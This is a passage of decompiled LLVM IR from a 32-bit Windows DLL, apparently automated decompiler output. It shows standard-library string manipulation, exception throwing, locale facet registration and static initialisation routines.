  %11 = call i32 @"?_Xbad_alloc@std@@YAXXZ"(), !insn.addr !3265
  %12 = call i32 @__asm_int3(), !insn.addr !3266
  %13 = call i32 @__asm_int3(), !insn.addr !3267
  %14 = call i32 @__asm_int3(), !insn.addr !3268
  %15 = call i32 @__asm_int3(), !insn.addr !3269
  ret i32 %15, !insn.addr !3269
}

define i32 @function_100063d0() local_unnamed_addr {
dec_label_pc_100063d0:
  %0 = call i32 @"?_Xinvalid_argument@std@@YAXPBD@Z.8"(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_100393a8, i32 0, i32 0)), !insn.addr !3270
  %1 = call i32 @__asm_int3(), !insn.addr !3271
  %2 = call i32 @__asm_int3(), !insn.addr !3272
  %3 = call i32 @__asm_int3(), !insn.addr !3273
  %4 = call i32 @__asm_int3(), !insn.addr !3274
  %5 = call i32 @__asm_int3(), !insn.addr !3275
  %6 = call i32 @__asm_int3(), !insn.addr !3276
  ret i32 %6, !insn.addr !3276
}

define i32 @function_100063e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100063e0:
  %esi.2.reg2mem = alloca i32, !insn.addr !3277
  %.pre-phi7.reg2mem = alloca i32*, !insn.addr !3277
  %esi.1.reg2mem = alloca i32, !insn.addr !3277
  %esi.0.reg2mem = alloca i32, !insn.addr !3277
  %edi.0.reg2mem = alloca i32, !insn.addr !3277
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !3277
  %ecx.2.reg2mem = alloca i32, !insn.addr !3277
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !3277
  %ecx.0.reg2mem = alloca i32, !insn.addr !3277
  %.reg2mem8 = alloca i32, !insn.addr !3277
  %.reg2mem = alloca i32, !insn.addr !3277
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i8, align 1
  %4 = trunc i32 %1 to i8, !insn.addr !3277
  store i8 %4, i8* %stack_var_-4, align 1, !insn.addr !3277
  %5 = add i32 %3, 16, !insn.addr !3278
  %6 = inttoptr i32 %5 to i32*, !insn.addr !3278
  %7 = load i32, i32* %6, align 4, !insn.addr !3278
  %8 = icmp ult i32 %7, %arg1, !insn.addr !3279
  br i1 %8, label %dec_label_pc_10006470, label %dec_label_pc_100063f2, !insn.addr !3280

dec_label_pc_100063f2:                            ; preds = %dec_label_pc_100063e0
  %9 = sub i32 %7, %arg1, !insn.addr !3281
  %10 = icmp ugt i32 %9, %arg2
  br i1 %10, label %dec_label_pc_10006422, label %dec_label_pc_100063fd, !insn.addr !3282

dec_label_pc_100063fd:                            ; preds = %dec_label_pc_100063f2
  store i32 %arg1, i32* %6, align 4, !insn.addr !3283
  %11 = add i32 %3, %arg1
  %12 = inttoptr i32 %11 to i8*
  store i8 0, i8* %12, align 1
  ret i32 %3, !insn.addr !3284

dec_label_pc_10006422:                            ; preds = %dec_label_pc_100063f2
  %13 = icmp eq i32 %arg2, 0, !insn.addr !3285
  br i1 %13, label %dec_label_pc_10006467, label %dec_label_pc_10006426, !insn.addr !3286

dec_label_pc_10006426:                            ; preds = %dec_label_pc_10006422
  %14 = add i32 %3, %arg1, !insn.addr !3287
  %15 = sub i32 %7, %arg2, !insn.addr !3288
  %16 = sub i32 %15, %arg1, !insn.addr !3289
  store i32 %16, i32* %stack_var_-20, align 4, !insn.addr !3290
  %17 = add i32 %14, %arg2, !insn.addr !3291
  %18 = inttoptr i32 %14 to i32*, !insn.addr !3292
  %19 = inttoptr i32 %17 to i32*, !insn.addr !3292
  %20 = call i32* @_memcpy(i32* %18, i32* %19, i32 %16), !insn.addr !3292
  store i32 %15, i32* %6, align 4, !insn.addr !3293
  %21 = add i32 %3, 20, !insn.addr !3294
  %22 = inttoptr i32 %21 to i32*, !insn.addr !3294
  %23 = load i32, i32* %22, align 4, !insn.addr !3294
  %24 = icmp ult i32 %23, 16, !insn.addr !3294
  br i1 %24, label %dec_label_pc_10006461, label %dec_label_pc_10006452, !insn.addr !3295

dec_label_pc_10006452:                            ; preds = %dec_label_pc_10006426
  %25 = add i32 %15, %14, !insn.addr !3296
  %26 = inttoptr i32 %25 to i8*, !insn.addr !3296
  store i8 0, i8* %26, align 1, !insn.addr !3296
  ret i32 %3, !insn.addr !3297

dec_label_pc_10006461:                            ; preds = %dec_label_pc_10006426
  %27 = add i32 %15, %3, !insn.addr !3298
  %28 = inttoptr i32 %27 to i8*, !insn.addr !3298
  store i8 0, i8* %28, align 1, !insn.addr !3298
  br label %dec_label_pc_10006467, !insn.addr !3298

dec_label_pc_10006467:                            ; preds = %dec_label_pc_100064a5, %dec_label_pc_1000657b, %dec_label_pc_10006461, %dec_label_pc_10006422
  ret i32 %3, !insn.addr !3299

dec_label_pc_10006470:                            ; preds = %dec_label_pc_100063e0
  %29 = call i32 @function_100063d0(), !insn.addr !3300
  %30 = call i32 @__asm_int3(), !insn.addr !3301
  %31 = call i32 @__asm_int3(), !insn.addr !3302
  %32 = call i32 @__asm_int3(), !insn.addr !3303
  %33 = call i32 @__asm_int3(), !insn.addr !3304
  %34 = call i32 @__asm_int3(), !insn.addr !3305
  %35 = call i32 @__asm_int3(), !insn.addr !3306
  %36 = call i32 @__asm_int3(), !insn.addr !3307
  %37 = call i32 @__asm_int3(), !insn.addr !3308
  %38 = call i32 @__asm_int3(), !insn.addr !3309
  %39 = call i32 @__asm_int3(), !insn.addr !3310
  %40 = call i32 @__asm_int3(), !insn.addr !3311
  %41 = ptrtoint i8* %stack_var_-4 to i32, !insn.addr !3312
  store i32 %41, i32* %stack_var_-20, align 4, !insn.addr !3312
  store i32 %7, i32* %stack_var_-32, align 4, !insn.addr !3313
  %42 = load i32, i32* %6, align 4, !insn.addr !3314
  %43 = icmp ult i32 %42, %0, !insn.addr !3315
  br i1 %43, label %dec_label_pc_1000658a, label %dec_label_pc_10006496, !insn.addr !3316

dec_label_pc_10006496:                            ; preds = %dec_label_pc_10006470
  %44 = sub i32 0, %42
  %45 = sub i32 %44, 1
  %46 = icmp ult i32 %2, %45
  br i1 %46, label %dec_label_pc_100064a5, label %dec_label_pc_1000658f, !insn.addr !3317

dec_label_pc_100064a5:                            ; preds = %dec_label_pc_10006496
  %47 = icmp eq i32 %2, 0, !insn.addr !3318
  br i1 %47, label %dec_label_pc_10006467, label %dec_label_pc_100064b0, !insn.addr !3319

dec_label_pc_100064b0:                            ; preds = %dec_label_pc_100064a5
  %48 = add i32 %42, %2, !insn.addr !3320
  %49 = icmp eq i32 %48, 0, !insn.addr !3321
  %50 = icmp eq i1 %49, false, !insn.addr !3322
  br i1 %50, label %dec_label_pc_100064d7, label %dec_label_pc_100064b4, !insn.addr !3322

dec_label_pc_100064b4:                            ; preds = %dec_label_pc_100064b0
  store i32 %48, i32* %6, align 4, !insn.addr !3323
  %51 = add i32 %3, 20, !insn.addr !3324
  %52 = inttoptr i32 %51 to i32*, !insn.addr !3324
  %53 = load i32, i32* %52, align 4, !insn.addr !3324
  %54 = icmp ult i32 %53, 16, !insn.addr !3324
  br i1 %54, label %dec_label_pc_100064cb, label %dec_label_pc_100064bd, !insn.addr !3325

dec_label_pc_100064bd:                            ; preds = %dec_label_pc_100064b4
  %55 = inttoptr i32 %42 to i8*, !insn.addr !3326
  store i8 0, i8* %55, align 1, !insn.addr !3326
  ret i32 %3, !insn.addr !3327

dec_label_pc_100064cb:                            ; preds = %dec_label_pc_100064b4
  %56 = inttoptr i32 %3 to i8*, !insn.addr !3328
  store i8 0, i8* %56, align 1, !insn.addr !3328
  ret i32 %3, !insn.addr !3329

dec_label_pc_100064d7:                            ; preds = %dec_label_pc_100064b0
  %57 = add i32 %3, 20, !insn.addr !3330
  %58 = inttoptr i32 %57 to i32*, !insn.addr !3330
  %59 = load i32, i32* %58, align 4, !insn.addr !3330
  %60 = icmp ult i32 %59, %48, !insn.addr !3330
  %61 = icmp eq i1 %60, false, !insn.addr !3331
  store i32 %42, i32* %.reg2mem, !insn.addr !3331
  store i32 %59, i32* %.reg2mem8, !insn.addr !3331
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !3331
  store i32* %stack_var_-32, i32** %esp.0.in.reg2mem, !insn.addr !3331
  br i1 %61, label %dec_label_pc_100064e7, label %dec_label_pc_100064dc, !insn.addr !3331

dec_label_pc_100064dc:                            ; preds = %dec_label_pc_100064d7
  store i32 %48, i32* %stack_var_-36, align 4, !insn.addr !3332
  %62 = call i32 @function_10005f40(i32 %48, i32 %7, i32 %3, i32 %2), !insn.addr !3333
  %.pre = load i32, i32* %58, align 4
  %.pre4 = load i32, i32* %6, align 4
  store i32 %.pre4, i32* %.reg2mem, !insn.addr !3334
  store i32 %.pre, i32* %.reg2mem8, !insn.addr !3334
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !3334
  br label %dec_label_pc_100064e7, !insn.addr !3334

dec_label_pc_100064e7:                            ; preds = %dec_label_pc_100064dc, %dec_label_pc_100064d7
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %.reload9 = load i32, i32* %.reg2mem8, !insn.addr !3335
  %.reload = load i32, i32* %.reg2mem, !insn.addr !3336
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %63 = icmp ult i32 %.reload9, 16, !insn.addr !3337
  %storemerge3 = select i1 %63, i32 %3, i32 %ecx.0.reload
  %64 = sub i32 %.reload, %0, !insn.addr !3338
  %65 = add i32 %esp.0, -4, !insn.addr !3339
  %66 = inttoptr i32 %65 to i32*, !insn.addr !3339
  store i32 %64, i32* %66, align 4, !insn.addr !3339
  %67 = add i32 %storemerge3, %0, !insn.addr !3340
  %68 = add i32 %esp.0, -8, !insn.addr !3341
  %69 = inttoptr i32 %68 to i32*, !insn.addr !3341
  store i32 %67, i32* %69, align 4, !insn.addr !3341
  %70 = add i32 %67, %2, !insn.addr !3342
  %71 = add i32 %esp.0, -12, !insn.addr !3343
  %72 = inttoptr i32 %71 to i32*, !insn.addr !3343
  store i32 %70, i32* %72, align 4, !insn.addr !3343
  %73 = inttoptr i32 %storemerge3 to i32*, !insn.addr !3344
  %74 = call i32* @_memcpy(i32* %73, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32)), !insn.addr !3344
  %75 = icmp eq i32 %2, 1, !insn.addr !3345
  %76 = icmp eq i1 %75, false, !insn.addr !3346
  %77 = load i32, i32* %58, align 4
  %78 = icmp ult i32 %77, 16
  br i1 %76, label %dec_label_pc_10006543, label %dec_label_pc_10006523, !insn.addr !3346

dec_label_pc_10006523:                            ; preds = %dec_label_pc_100064e7
  %79 = load i8, i8* %stack_var_-4, align 1
  br i1 %78, label %dec_label_pc_10006536, label %dec_label_pc_10006529, !insn.addr !3347

dec_label_pc_10006529:                            ; preds = %dec_label_pc_10006523
  %80 = inttoptr i32 %67 to i8*, !insn.addr !3348
  store i8 %79, i8* %80, align 1, !insn.addr !3348
  br label %dec_label_pc_10006563, !insn.addr !3349

dec_label_pc_10006536:                            ; preds = %dec_label_pc_10006523
  %81 = add i32 %3, %0, !insn.addr !3350
  %82 = inttoptr i32 %81 to i8*, !insn.addr !3350
  store i8 %79, i8* %82, align 1, !insn.addr !3350
  br label %dec_label_pc_10006563, !insn.addr !3351

dec_label_pc_10006543:                            ; preds = %dec_label_pc_100064e7
  %storemerge2 = select i1 %78, i32 %3, i32 %storemerge3
  %83 = load i8, i8* %stack_var_-4, align 1, !insn.addr !3352
  %84 = sext i8 %83 to i32, !insn.addr !3352
  store i32 %84, i32* %69, align 4, !insn.addr !3353
  %85 = add i32 %storemerge2, %0, !insn.addr !3354
  store i32 %85, i32* %72, align 4, !insn.addr !3355
  %86 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3356
  store i32 %storemerge3, i32* %ecx.2.reg2mem, !insn.addr !3357
  br label %dec_label_pc_10006563, !insn.addr !3357

dec_label_pc_10006563:                            ; preds = %dec_label_pc_10006543, %dec_label_pc_10006536, %dec_label_pc_10006529
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %87 = load i32, i32* %58, align 4, !insn.addr !3358
  %88 = icmp ult i32 %87, 16, !insn.addr !3358
  store i32 %48, i32* %6, align 4, !insn.addr !3359
  br i1 %88, label %dec_label_pc_1000657b, label %dec_label_pc_1000656c, !insn.addr !3360

dec_label_pc_1000656c:                            ; preds = %dec_label_pc_10006563
  %89 = add i32 %ecx.2.reload, %48, !insn.addr !3361
  %90 = inttoptr i32 %89 to i8*, !insn.addr !3361
  store i8 0, i8* %90, align 1, !insn.addr !3361
  ret i32 %3, !insn.addr !3362

dec_label_pc_1000657b:                            ; preds = %dec_label_pc_10006563
  %91 = add i32 %48, %3, !insn.addr !3363
  %92 = inttoptr i32 %91 to i8*, !insn.addr !3363
  store i8 0, i8* %92, align 1, !insn.addr !3363
  br label %dec_label_pc_10006467, !insn.addr !3363

dec_label_pc_1000658a:                            ; preds = %dec_label_pc_10006470
  %93 = call i32 @function_100063d0(), !insn.addr !3364
  br label %dec_label_pc_1000658f, !insn.addr !3364

dec_label_pc_1000658f:                            ; preds = %dec_label_pc_10006496, %dec_label_pc_1000658a
  %94 = call i32 @function_10004f70(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3365
  %95 = call i32 @__asm_int3(), !insn.addr !3366
  %96 = call i32 @__asm_int3(), !insn.addr !3367
  %97 = call i32 @__asm_int3(), !insn.addr !3368
  %98 = call i32 @__asm_int3(), !insn.addr !3369
  %99 = call i32 @__asm_int3(), !insn.addr !3370
  %100 = call i32 @__asm_int3(), !insn.addr !3371
  %101 = call i32 @__asm_int3(), !insn.addr !3372
  %102 = call i32 @__asm_int3(), !insn.addr !3373
  %103 = call i32 @__asm_int3(), !insn.addr !3374
  %104 = call i32 @__asm_int3(), !insn.addr !3375
  %105 = call i32 @__asm_int3(), !insn.addr !3376
  %106 = call i32 @__asm_int3(), !insn.addr !3377
  %107 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !3378
  store i32 %107, i32* %stack_var_-36, align 4, !insn.addr !3378
  %108 = call i32 @__readfsdword(i32 0), !insn.addr !3379
  store i32 %108, i32* %stack_var_-48, align 4, !insn.addr !3380
  %109 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !3381
  call void @__writefsdword(i32 0, i32 %109), !insn.addr !3382
  store i32 0, i32* %stack_var_-92, align 4, !insn.addr !3383
  %110 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !3384
  %111 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %110), !insn.addr !3385
  %112 = load i32, i32* @global_var_1003e058, align 4, !insn.addr !3386
  %113 = load i32, i32* @global_var_10040a40, align 4, !insn.addr !3387
  store i32 %113, i32* %stack_var_-52, align 4, !insn.addr !3388
  %114 = icmp eq i32 %112, 0, !insn.addr !3389
  %115 = icmp eq i1 %114, false, !insn.addr !3390
  store i32* %stack_var_-92, i32** %esp.1.in.reg2mem, !insn.addr !3390
  store i32 %112, i32* %edi.0.reg2mem, !insn.addr !3390
  br i1 %115, label %dec_label_pc_1000661b, label %dec_label_pc_100065ec, !insn.addr !3390

dec_label_pc_100065ec:                            ; preds = %dec_label_pc_1000658f
  store i32 %112, i32* %stack_var_-96, align 4, !insn.addr !3391
  %116 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !3392
  %117 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %116), !insn.addr !3393
  %118 = load i32, i32* @global_var_1003e058, align 4, !insn.addr !3394
  %119 = icmp eq i32 %118, %112, !insn.addr !3394
  %120 = icmp eq i1 %119, false, !insn.addr !3395
  br i1 %120, label %dec_label_pc_1000660d, label %dec_label_pc_100065fd, !insn.addr !3395

dec_label_pc_100065fd:                            ; preds = %dec_label_pc_100065ec
  %121 = load i32, i32* @global_var_1003e03c, align 4, !insn.addr !3396
  %122 = add i32 %121, 1, !insn.addr !3397
  store i32 %122, i32* @global_var_1003e03c, align 4, !insn.addr !3398
  store i32 %122, i32* @global_var_1003e058, align 4, !insn.addr !3399
  br label %dec_label_pc_1000660d, !insn.addr !3399

dec_label_pc_1000660d:                            ; preds = %dec_label_pc_100065fd, %dec_label_pc_100065ec
  %123 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !3400
  %124 = load i32, i32* @global_var_1003e058, align 4, !insn.addr !3401
  store i32* %stack_var_-96, i32** %esp.1.in.reg2mem, !insn.addr !3401
  store i32 %124, i32* %edi.0.reg2mem, !insn.addr !3401
  br label %dec_label_pc_1000661b, !insn.addr !3401

dec_label_pc_1000661b:                            ; preds = %dec_label_pc_1000660d, %dec_label_pc_1000658f
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %125 = add i32 %3, 4, !insn.addr !3402
  %126 = inttoptr i32 %125 to i32*, !insn.addr !3402
  %127 = load i32, i32* %126, align 4, !insn.addr !3402
  %128 = add i32 %127, 12, !insn.addr !3403
  %129 = inttoptr i32 %128 to i32*, !insn.addr !3403
  %130 = load i32, i32* %129, align 4, !insn.addr !3403
  %131 = icmp ult i32 %edi.0.reload, %130, !insn.addr !3403
  %132 = icmp eq i1 %131, false, !insn.addr !3404
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !3404
  br i1 %132, label %dec_label_pc_10006634, label %dec_label_pc_10006626, !insn.addr !3404

dec_label_pc_10006626:                            ; preds = %dec_label_pc_1000661b
  %133 = add i32 %127, 8, !insn.addr !3405
  %134 = inttoptr i32 %133 to i32*, !insn.addr !3405
  %135 = load i32, i32* %134, align 4, !insn.addr !3405
  %136 = mul i32 %edi.0.reload, 4, !insn.addr !3406
  %137 = add i32 %135, %136, !insn.addr !3406
  %138 = inttoptr i32 %137 to i32*, !insn.addr !3406
  %139 = load i32, i32* %138, align 4, !insn.addr !3406
  %140 = icmp eq i32 %139, 0, !insn.addr !3407
  %141 = icmp eq i1 %140, false, !insn.addr !3408
  store i32 %139, i32* %esi.0.reg2mem, !insn.addr !3408
  store i32 %139, i32* %esi.2.reg2mem, !insn.addr !3408
  br i1 %141, label %dec_label_pc_10006699, label %dec_label_pc_10006634, !insn.addr !3408

dec_label_pc_10006634:                            ; preds = %dec_label_pc_1000661b, %dec_label_pc_10006626
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %142 = add i32 %127, 20, !insn.addr !3409
  %143 = inttoptr i32 %142 to i8*, !insn.addr !3409
  %144 = load i8, i8* %143, align 1, !insn.addr !3409
  %145 = icmp eq i8 %144, 0, !insn.addr !3409
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !3410
  br i1 %145, label %dec_label_pc_1000664a, label %dec_label_pc_1000663a, !insn.addr !3410

dec_label_pc_1000663a:                            ; preds = %dec_label_pc_10006634
  %146 = call i32 @function_1000e50f(), !insn.addr !3411
  %147 = add i32 %146, 12, !insn.addr !3412
  %148 = inttoptr i32 %147 to i32*, !insn.addr !3412
  %149 = load i32, i32* %148, align 4, !insn.addr !3412
  %150 = icmp ult i32 %edi.0.reload, %149, !insn.addr !3412
  %151 = icmp eq i1 %150, false, !insn.addr !3413
  br i1 %151, label %dec_label_pc_1000664e, label %dec_label_pc_10006644, !insn.addr !3413

dec_label_pc_10006644:                            ; preds = %dec_label_pc_1000663a
  %152 = add i32 %146, 8, !insn.addr !3414
  %153 = inttoptr i32 %152 to i32*, !insn.addr !3414
  %154 = load i32, i32* %153, align 4, !insn.addr !3414
  %155 = mul i32 %edi.0.reload, 4, !insn.addr !3415
  %156 = add i32 %154, %155, !insn.addr !3415
  %157 = inttoptr i32 %156 to i32*, !insn.addr !3415
  %158 = load i32, i32* %157, align 4, !insn.addr !3415
  store i32 %158, i32* %esi.1.reg2mem, !insn.addr !3415
  br label %dec_label_pc_1000664a, !insn.addr !3415

dec_label_pc_1000664a:                            ; preds = %dec_label_pc_10006644, %dec_label_pc_10006634
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %159 = icmp eq i32 %esi.1.reload, 0, !insn.addr !3416
  %160 = icmp eq i1 %159, false, !insn.addr !3417
  store i32 %esi.1.reload, i32* %esi.2.reg2mem, !insn.addr !3417
  br i1 %160, label %dec_label_pc_10006699, label %dec_label_pc_1000664e, !insn.addr !3417

dec_label_pc_1000664e:                            ; preds = %dec_label_pc_1000664a, %dec_label_pc_1000663a
  %161 = icmp eq i32 %113, 0, !insn.addr !3418
  store i32 %113, i32* %esi.2.reg2mem, !insn.addr !3419
  br i1 %161, label %dec_label_pc_10006656, label %dec_label_pc_10006699, !insn.addr !3419

dec_label_pc_10006656:                            ; preds = %dec_label_pc_1000664e
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %162 = add i32 %esp.1, -4
  %163 = inttoptr i32 %162 to i32*
  %164 = add i32 %esp.1, -8, !insn.addr !3420
  %165 = inttoptr i32 %164 to i32*, !insn.addr !3420
  %166 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !3420
  store i32 %166, i32* %165, align 4, !insn.addr !3420
  %167 = call i32 @function_10001660(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3421
  %168 = icmp eq i32 %167, -1, !insn.addr !3422
  %169 = icmp eq i1 %168, false, !insn.addr !3423
  store i32* %163, i32** %.pre-phi7.reg2mem, !insn.addr !3423
  br i1 %169, label %dec_label_pc_10006680, label %dec_label_pc_1000666a, !insn.addr !3423

dec_label_pc_1000666a:                            ; preds = %dec_label_pc_10006656
  %170 = call i32 @"??0bad_cast@std@@QAE@XZ"(), !insn.addr !3424
  store i32 ptrtoint (i32* @global_var_1003bdd0 to i32), i32* %163, align 4, !insn.addr !3425
  %171 = ptrtoint i32* %stack_var_-72 to i32, !insn.addr !3426
  store i32 %171, i32* %165, align 4, !insn.addr !3426
  %172 = call i32 @"__CxxThrowException@8"(), !insn.addr !3427
  %.pre5 = add i32 %esp.1, -12, !insn.addr !3428
  %.pre6 = inttoptr i32 %.pre5 to i32*, !insn.addr !3428
  store i32* %.pre6, i32** %.pre-phi7.reg2mem, !insn.addr !3427
  br label %dec_label_pc_10006680, !insn.addr !3427

dec_label_pc_10006680:                            ; preds = %dec_label_pc_1000666a, %dec_label_pc_10006656
  %.pre-phi7.reload = load i32*, i32** %.pre-phi7.reg2mem
  %173 = load i32, i32* %stack_var_-52, align 4, !insn.addr !3429
  store i32 %173, i32* @global_var_10040a40, align 4, !insn.addr !3430
  store i32 %173, i32* %.pre-phi7.reload, align 4, !insn.addr !3428
  %174 = call i32 @"?_Facet_Register@std@@YAXPAV_Facet_base@1@@Z"(i32* nonnull @1), !insn.addr !3431
  store i32 %173, i32* %esi.2.reg2mem, !insn.addr !3432
  br label %dec_label_pc_10006699, !insn.addr !3432

dec_label_pc_10006699:                            ; preds = %dec_label_pc_1000664e, %dec_label_pc_10006680, %dec_label_pc_1000664a, %dec_label_pc_10006626
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %175 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !3433
  %176 = load i32, i32* %stack_var_-48, align 4, !insn.addr !3434
  call void @__writefsdword(i32 0, i32 %176), !insn.addr !3435
  ret i32 %esi.2.reload, !insn.addr !3436
}

define i32 @function_100066c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100066c0:
  %0 = call i32 @__readfsdword(i32 44), !insn.addr !3437
  %1 = load i32, i32* @global_var_1003e578, align 4, !insn.addr !3438
  %2 = mul i32 %1, 4, !insn.addr !3439
  %3 = add i32 %2, %0, !insn.addr !3439
  %4 = inttoptr i32 %3 to i32*, !insn.addr !3439
  %5 = load i32, i32* %4, align 4, !insn.addr !3439
  %6 = load void ()*, void ()** @global_var_10040a50, align 4, !insn.addr !3440
  %7 = ptrtoint void ()* %6 to i32, !insn.addr !3440
  %8 = add i32 %5, 4, !insn.addr !3441
  %9 = inttoptr i32 %8 to i32*, !insn.addr !3441
  %10 = load i32, i32* %9, align 4, !insn.addr !3441
  %11 = icmp slt i32 %10, %7, !insn.addr !3442
  br i1 %11, label %dec_label_pc_100066dc, label %dec_label_pc_1000671d, !insn.addr !3442

dec_label_pc_100066dc:                            ; preds = %dec_label_pc_100066c0
  %12 = call i32 @__Init_thread_header(i32* bitcast (void ()** @global_var_10040a50 to i32*)), !insn.addr !3443
  %13 = load void ()*, void ()** @global_var_10040a50, align 4, !insn.addr !3444
  %14 = icmp eq void ()* %13, inttoptr (i32 -1 to void ()*), !insn.addr !3444
  %15 = icmp eq i1 %14, false, !insn.addr !3445
  br i1 %15, label %dec_label_pc_1000671d, label %dec_label_pc_100066f2, !insn.addr !3445

dec_label_pc_100066f2:                            ; preds = %dec_label_pc_100066dc
  store i32 ptrtoint (%vtable_1002d36c_type* @global_var_1002d36c to i32), i32* @global_var_10040a48, align 4, !insn.addr !3446
  store i32 5, i32* @global_var_10040a4c, align 4, !insn.addr !3447
  %16 = call i32 @_atexit(void ()* inttoptr (i32 268619040 to void ()*)), !insn.addr !3448
  %17 = call i32 @__Init_thread_footer(i32* bitcast (void ()** @global_var_10040a50 to i32*)), !insn.addr !3449
  br label %dec_label_pc_1000671d, !insn.addr !3450

dec_label_pc_1000671d:                            ; preds = %dec_label_pc_100066c0, %dec_label_pc_100066f2, %dec_label_pc_100066dc
  ret i32 ptrtoint (i32* @global_var_10040a48 to i32), !insn.addr !3451
}

define i32 @function_10006730(i32* %arg1) local_unnamed_addr {
dec_label_pc_10006730:
  %esp.0.reg2mem = alloca i32, !insn.addr !3452
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !3453
  %3 = call i32 @__readfsdword(i32 0), !insn.addr !3454
  store i32 %3, i32* %stack_var_-16, align 4, !insn.addr !3455
  %4 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !3456
  %5 = xor i32 %4, %2, !insn.addr !3457
  store i32 %5, i32* %stack_var_-40, align 4, !insn.addr !3458
  %6 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !3458
  %7 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3459
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !3460
  %8 = add i32 %1, 16, !insn.addr !3461
  %9 = inttoptr i32 %8 to i32*, !insn.addr !3461
  store i32 0, i32* %9, align 4, !insn.addr !3461
  %10 = add i32 %1, 20, !insn.addr !3462
  %11 = inttoptr i32 %10 to i32*, !insn.addr !3462
  store i32 15, i32* %11, align 4, !insn.addr !3462
  %12 = inttoptr i32 %1 to i8*, !insn.addr !3463
  store i8 0, i8* %12, align 1, !insn.addr !3463
  %13 = add i32 %0, 16, !insn.addr !3464
  %14 = inttoptr i32 %13 to i32*, !insn.addr !3464
  %15 = load i32, i32* %14, align 4, !insn.addr !3464
  %16 = load i32, i32* %9, align 4, !insn.addr !3465
  %17 = add i32 %15, 9, !insn.addr !3466
  %18 = icmp ugt i32 %16, %17
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !3467
  br i1 %18, label %dec_label_pc_100067d3, label %dec_label_pc_10006792, !insn.addr !3467

dec_label_pc_10006792:                            ; preds = %dec_label_pc_10006730
  %19 = load i32, i32* %11, align 4, !insn.addr !3468
  %20 = icmp eq i32 %19, %17, !insn.addr !3469
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !3470
  br i1 %20, label %dec_label_pc_100067d3, label %dec_label_pc_10006799, !insn.addr !3470

dec_label_pc_10006799:                            ; preds = %dec_label_pc_10006792
  %21 = icmp ult i32 %19, %17, !insn.addr !3469
  %22 = icmp eq i1 %21, false, !insn.addr !3471
  br i1 %22, label %dec_label_pc_100067a5, label %dec_label_pc_1000679b, !insn.addr !3471

dec_label_pc_1000679b:                            ; preds = %dec_label_pc_10006799
  store i32 %17, i32* %stack_var_-44, align 4, !insn.addr !3472
  %23 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !3472
  %24 = call i32 @function_10005f40(i32 %17, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3473
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !3474
  br label %dec_label_pc_100067d3, !insn.addr !3474

dec_label_pc_100067a5:                            ; preds = %dec_label_pc_10006799
  %25 = icmp ult i32 %17, 16, !insn.addr !3475
  %26 = icmp eq i1 %25, false, !insn.addr !3476
  %27 = icmp ult i32 %19, 16, !insn.addr !3477
  %or.cond = or i1 %26, %27
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !3476
  br i1 %or.cond, label %dec_label_pc_100067d3, label %dec_label_pc_100067af, !insn.addr !3476

dec_label_pc_100067af:                            ; preds = %dec_label_pc_100067a5
  %28 = add i32 %16, 1, !insn.addr !3478
